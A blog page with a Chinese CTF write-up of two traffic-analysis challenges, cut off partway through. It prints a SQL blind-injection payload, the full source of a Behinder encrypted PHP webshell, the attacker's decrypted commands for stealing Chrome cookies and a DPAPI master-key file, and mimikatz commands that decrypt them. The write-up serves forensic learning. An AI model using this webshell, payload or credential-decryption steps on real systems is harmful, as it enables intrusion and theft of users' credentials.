@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Laurel">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Laurel">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Two flow analysis problems of 3CTF · 将至将至 | Notes of laure1</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/29.jpg">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Notes of Laurel | 大雨将至</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Two flow analysis problems of 3CTF</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Notes of Laurel | 大雨将至</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpeg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Two flow analysis problems of 3CTF
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Misc">Misc</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Competition">Competition</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.8k</span>Reading time: <span class="post-count reading-time">8 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/11/06</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="第一道忘了叫啥了"><a href="#第一道忘了叫啥了" class="headerlink" title="第一道忘了叫啥了"></a>第一道忘了叫啥了</h3><p>是初赛的Misc1题目，给了一个1.pcap文件。内容是黑客进行bool盲注的过程。</p>
+<p>看一下HTTP，很容易看到一个readme.7z的压缩包，导出来，就一个readme.txt，没啥了。</p>
+<p>然后可以注意到，盲注过程中响应内容的大小不是706bytes就是722bytes。（刚开始我还在想这尼玛会不会是二进制，对不起打扰了</p>
+<p>706字节 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1572873599429.png" alt="1572873599429"></p>
+<p>722字节 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1572873572160.png" alt="1572873572160"></p>
+<p>比如说，攻击者刚开始爆数据库个数时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ((select count(schema_name) from information_schema.schemata) &gt; 0)#</span><br></pre></td></tr></table></figure>
+
+<p>一直到 <code>&gt;6</code>都返回的是706字节，而<code>&gt;7</code>时，返回了722字节，说明这时候相当于是报错了，也就是说个数应该是7。</p>
+<blockquote>
+<p>突然发现盲注这块是我的盲点，，哭了</p>
+</blockquote>
+<p>然后看到后面开始查询字段的时候，看到是有<code>url</code>和<code>passwd</code>两个字段。</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1572875300950.png" alt="1572875300950"></p>
+<p>嗯所以需要根据回显内容把这两个字段给解出来，一位一位地慢慢解，，</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/nb.jpg" alt="nb"></p>
+<p>解出来是这样的（然鹅我令人堪忧的数学把我带到了上一个字符去2333：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url:</span><br><span class="line">116 46 99 110 47 65 105 56 80 104 113 83 98</span><br><span class="line">t.cn/Ai8PhqSb</span><br><span class="line">passwd:</span><br><span class="line">98 107 105 115</span><br><span class="line">bkis</span><br></pre></td></tr></table></figure>
+
+<p>这个短链接其实是个百度网盘 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1572877383786.png" alt="1572877383786"></p>
+<p>flag.zip是加密的，内容有flag.txt和readme.txt。</p>
+<p>那么这就很容易想到了明文攻击了（虽然比赛的时候我没想到，因为我当时做题已经做傻了，，</p>
+<p>嗯然后AAPR明文跑密钥解密就完事儿了。<code>flag{1d0ea6a36f6aaf7fa5d4b007454227d6}</code></p>
+<p>当然也有师傅闲着没事儿跑了一个多小时把口令也跑出来了：<code>CtF36o!s0</code></p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/sj.jpg" alt="sj"></p>
+<hr>
+<h3 id="第二道好像是叫黑客攻击啥的"><a href="#第二道好像是叫黑客攻击啥的" class="headerlink" title="第二道好像是叫黑客攻击啥的"></a>第二道好像是叫黑客攻击啥的</h3><p>首先看到的是shell脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),<span class="number">16</span>);</span><br><span class="line">    $_SESSION[<span class="string">'k'</span>]=$key;</span><br><span class="line">    <span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[<span class="string">'k'</span>];</span><br><span class="line">	$post=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=<span class="string">"base64_"</span>.<span class="string">"decode"</span>;</span><br><span class="line">		$post=$t($post.<span class="string">""</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, <span class="string">"AES128"</span>, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p)</span> </span>&#123;<span class="keyword">eval</span>($p.<span class="string">""</span>);&#125;&#125;</span><br><span class="line">	@<span class="keyword">new</span> C($params);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>菜鸡的我没用过，搜了一下才知道，这是当下很流行的冰蝎，利用的是动态二进制加密。</p>
+<blockquote>
+<p>项目地址：<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></p>
+</blockquote>
+<p>上面那段代码的流程大致是：</p>
+<p>当客户端以GET发起请求并设置了参数pass时，服务端会产生一个16位的随机密钥并写入Session。解密方式是，如果服务端不存在openssl，就用先base64解码，然后使用key进行循环异或加密；如果服务端能够加载openssl扩展，那就使用AES128解密。</p>
+<p>然后看一下流量包，首先产生了两次密钥 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1572878358488.png" alt="1572878358488"></p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1572878383516.png" alt="1572878383516"></p>
+<p>然后开始POST进行攻击 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1572878417035.png" alt="1572878417035"></p>
+<p>然后就是需要解密一下攻击者POST的内容了。我先试了试使用key进行异或解密：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    &#123;   </span><br><span class="line">        $key = <span class="string">'d59042be6e437849'</span>;</span><br><span class="line">        $post = <span class="string">'DzqZ3o6...内容太长此处省略'</span>;</span><br><span class="line">        $t=<span class="string">"base64_"</span>.<span class="string">"decode"</span>;</span><br><span class="line">        $post=$t($post.<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">                $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; &#125;</span><br><span class="line">                <span class="keyword">print</span> $post;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是解密后的内容乱乱的，所以应该不是。那就大概是AES了吧。然后去度娘上找了好几个网站，统统解不出来。我还用脚本试了试，也不行。<img src="C:/Users/65725/Pictures/b1.jpg" alt="b1"></p>
+<p>然后表哥给了一个网址，就能解出来了：<a href="http://tools.bugscaner.com/cryptoaes/" target="_blank" rel="noopener">http://tools.bugscaner.com/cryptoaes/</a></p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/b2.gif" alt="b2"></p>
+<p>将解密后的内容再base64一下就能看到攻击者具体在干什么了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">($content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$result = <span class="keyword">array</span>();</span><br><span class="line">	$result[<span class="string">"status"</span>] = base64_encode(<span class="string">"success"</span>);</span><br><span class="line">    $result[<span class="string">"msg"</span>] = base64_encode($content);</span><br><span class="line">    $key = $_SESSION[<span class="string">'k'</span>];</span><br><span class="line">    <span class="keyword">echo</span> encrypt(json_encode($result),$key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> openssl_encrypt($data, <span class="string">"AES128"</span>, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$content=<span class="string">"f5dfe44a-0213-45db-a617-8db5e5a07ab3"</span>;</span><br><span class="line">main($content);</span><br></pre></td></tr></table></figure>
+
+<p>把所有的攻击内容都解密出来看了一下（一共19次，罗列如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$content=<span class="string">"f5dfe44a-0213-45db-a617-8db5e5a07ab3"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/Desktop/"</span>;</span><br><span class="line">$mode=<span class="string">"show"</span>;$path=<span class="string">"C:/Users/shadow/Desktop/password.txt"</span>;$content=<span class="string">""</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Local/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Local/Google/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Local/Google/Chrome/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Local/Google/Chrome/User Data/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Local/Google/Chrome/User Data/Default/"</span>;</span><br><span class="line">$mode=<span class="string">"download"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Local/Google/Chrome/User Data/Default/Cookies"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Roaming/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Roaming/Microsoft/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Roaming/Microsoft/Protect/"</span>;</span><br><span class="line">$mode=<span class="string">"list"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Roaming/Microsoft/Protect/S-1-5-21-2127750816-4215895028-2373289296-1001/"</span>;</span><br><span class="line">$mode=<span class="string">"download"</span>;$path=<span class="string">"C:/Users/shadow/AppData/Roaming/Microsoft/Protect/S-1-5-21-2127750816-4215895028-2373289296-1001/6ecf76bd-1803-437e-92e6-28dd36c907aa"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者下载了两个文件。第一个是谷歌浏览器的cookies，第二个是用户的Master Key file。</p>
+<p>并且还查看了一下Desktop上的password.txt，内容解密后是<code>p@ssw0rd</code>。（把passwd放桌面可还行</p>
+<p>所以题目的意思大概是要我们导出谷歌浏览器中保存的密码。这就涉及到了DPAPI(Data Protection API)，是用来加密数据的接口，比如Chrome的Cookies。</p>
+<p>DPAPI使用了Master Key这个东西来加解密。而Master Key是通过用户的密码HASH来加密生成的。那Masterkey怎么得到呢，通过Masterkey File即可，也就是上面第二次下载的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;GUID&gt;</span><br><span class="line">&lt;SID&gt;是用户的安全描述符，&lt;GUID&gt;是Master Key的名字。</span><br></pre></td></tr></table></figure>
+
+<p>目前解题的话，我只想到了两个解题方法。</p>
+<h4 id="方法一：使用mimikatz"><a href="#方法一：使用mimikatz" class="headerlink" title="方法一：使用mimikatz"></a>方法一：使用mimikatz</h4><blockquote>
+<p>参考网址：<a href="https://ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#protecting-and-unprotecting-data" target="_blank" rel="noopener">https://ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#protecting-and-unprotecting-data</a></p>
+</blockquote>
+<p>目前已知用户登录密码password，用户SID，GUID，那就可以解出MasterKey了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::masterkey /in:&quot;C:\Users\65725\Downloads\ok\6ecf76bd-1803-437e-92e6-28dd36c907aa&quot; /sid:S-1-5-21-2127750816-4215895028-2373289296-1001 /password:p@ssw0rd /protected</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573011619215.png" alt="1573011619215"></p>
+<p>得到MasterKey为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dc273990f4a61dde19f7708be532a9ed08e9e0d21581fb29c6d3ddcfbccad5a4dfe09b9fdfe54c78841dead69035c89f3ab577522b58b9d7c5740fcdb8095c1a</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：如果敲入命令回车之后mimikatz直接退出了，那就说明master key file文件有问题，具体啥问题方法二写了。</p>
+</blockquote>
+<p>再利用其解密Chrome数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;C:\Users\65725\Downloads\ok\Cookies&quot; /unprotect /masterkey:dc273990f4a61dde19f7708be532a9ed08e9e0d21581fb29c6d3ddcfbccad5a4dfe09b9fdfe54c78841dead69035c89f3ab577522b58b9d7c5740fcdb8095c1a</span><br></pre></td></tr></table></figure>
+
+<p>得到的这个cookie值就是flag - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573011735542.png" alt="1573011735542"></p>
+<hr>
+<h4 id="方法二：利用Windows-Password-Recovery软件"><a href="#方法二：利用Windows-Password-Recovery软件" class="headerlink" title="方法二：利用Windows Password Recovery软件"></a>方法二：利用Windows Password Recovery软件</h4><blockquote>
+<p>参考链接：<a href="https://zhuanlan.zhihu.com/p/33634735" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33634735</a></p>
+</blockquote>
+<p>先用SQLite看一下导出的Cookies - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573006247230.png" alt="1573006247230"></p>
+<p>看到了encrypted_value的类型是Blob - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573006471266.png" alt="1573006471266"></p>
+<p>也就是说DPAPI blob位于数据库文件的encrypted_value段，先将其保存出来：</p>
